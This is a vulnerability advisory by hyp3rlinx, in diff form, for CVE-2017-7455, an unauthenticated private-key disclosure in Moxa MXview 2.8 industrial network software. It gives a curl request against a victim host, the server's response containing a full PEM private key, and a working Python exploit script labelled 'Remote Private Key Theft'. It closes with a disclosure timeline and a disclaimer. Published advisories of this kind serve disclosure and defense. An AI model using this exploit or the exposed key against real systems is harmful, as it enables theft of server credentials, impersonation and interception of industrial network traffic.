@@ -1,0 +1,136 @@
+[+] Credits: John Page AKA HYP3RLINX	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MOXA-MXVIEW-v2.8-REMOTE-PRIVATE-KEY-DISCLOSURE.txt
+[+] ISR: APPARITIONSEC            
+ 
+
+
+Vendor:
+============
+www.moxa.com
+
+
+
+Product:
+===========
+MXview V2.8
+
+Download:
+http://www.moxa.com/product/MXstudio.htm
+
+MXview Industrial Network Management Software.
+
+Auto discovery of network devices and physical connections
+Event playback for quick troubleshooting
+Color-coded VLAN/IGMP groups and other visualized network data
+Supports MXview ToGo mobile app for remote monitoring and notification—anytime, anywhere.
+
+
+
+Vulnerability Type:
+=============================
+Remote Private Key Disclosure
+
+
+
+CVE Reference:
+==============
+CVE-2017-7455
+
+
+
+Security Issue:
+================
+MXview stores a copy of its web servers private key under C:\Users\TARGET-USER\AppData\Roaming\moxa\mxview\web\certs\mxview.key.
+Remote attackers can easily access/read this private key "mxview.key" file by making an HTTP GET request.
+
+e.g.
+
+curl -v   http://VICTIM-IP:81/certs/mxview.key
+
+
+* About to connect() to VICTIM-IP port 81
+*   Trying VICTIM-IP... connected
+* Connected to VICTIM-IP (VICTIM-IP) port 81
+> GET /certs/mxview.key HTTP/1.1
+> User-Agent: curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 
+> Host: VICTIM-IP:81
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Tue Feb 28 14:18:00 2017
+< Server: GoAhead-Webs
+< Last-modified: Tue Feb 28 10:46:51 2017
+< Content-length: 916
+< Content-type: text/plain
+-----BEGIN PRIVATE KEY-----
+MIICdwIBADANBgkqhkiG2w0BAQEFAASCAmEwggJdAgEAAoGBAMO2BjHS6rFYqxPb
+QCjhVn5+UGwfICfETzk5JQvhkhc71bnsDHI7lVyYhheYLcPQBEglVolwGANPp7LF
+2lhG+UaSFfTVk8UDvV0qQpjSQvDjcWSuKBfceyT5zmI8ynxuMHoqBR7ZOSLY31z+
+Rxt+JCykwqfMGdjawnC5ivr8iWDpAgMBAAECgYAQpHjwYbQtcpHRtXJGR6s4RHuI
+RjlQyGPIRPC+iucGbMMm9Ui1qhVwc1Pry7gQj67dh7dNJqgUGAD1tdd0bEykKoqm
+ICgXj0HMPCLxUy4CHIZInsBhzAyp/3atkDIaeELZckCbmttkVvncDi+b9HnuL/To
+YwJpuLkpXEKpjK7iAQJBAOof+yliPn7UsBecw/Hc/ixeDRGI1kjtvuOvSi6jLZoj
+3rzODMSD1eRcrK/GJydWVT8TV3WXXYn3M1cu3kmQJKkCQQDV/zlBtFFPPVAl1zy7
+UBG+RPI63uXeaA0C1+RX2XfJSR4zeKxnWgalzUl0UwMgWB3Gpp2+VW5a/zw3aKlK
+6MJBAkBHPMXqWKdVZhfSh3Ojky+PhmqJjE5PUG/FzZ9Pw3zrqsBqSHPgE5Ewc/Zj
+YXKmavCbSaJR+GWQxjPL8knWrlJJAkEAkahnEJHrxkO1igw3Ckg0y4yiU+/kBr5M
+HONWSXV8U0WxiNdagf6FB9XzaXoXZuyTl+NQ+3yq4MVZ910F3jcQAQJBAI+q0AcX
+EskHai2Fx24gkHwwRxacsiXrRClxIj5NB52CSo2Sy6EF02DKQVWR3oIjDesXcWvl
++CPTV6agBkYxe7Q=
+-----END PRIVATE KEY-----
+
+
+
+Exploit:
+=========
+import socket
+
+print 'Moxa MXview 2.8 Remote Private Key Theft'
+print 'by hyp3rlinx\n'
+
+IP=raw_input("[Moxa MXview IP]> ")
+PORT=int(raw_input("[PORT]> "))
+STEAL_PRV_KEY="GET /certs/mxview.key HTTP/1.1\r\nHost: "+IP+"\r\n\r\n"
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((IP,PORT))
+s.send(STEAL_PRV_KEY)
+
+print 'Enjoy ur private server key!\n'
+print s.recv(512)
+
+s.close()
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+Critical
+
+
+
+Disclosure Timeline:
+===================================
+Vendor Notification:  March 5, 2017
+Vendor confirms vulnerability : March 21, 2017
+Vendor "updated firmware April 7, 2017" : March 29, 2017
+April 9, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
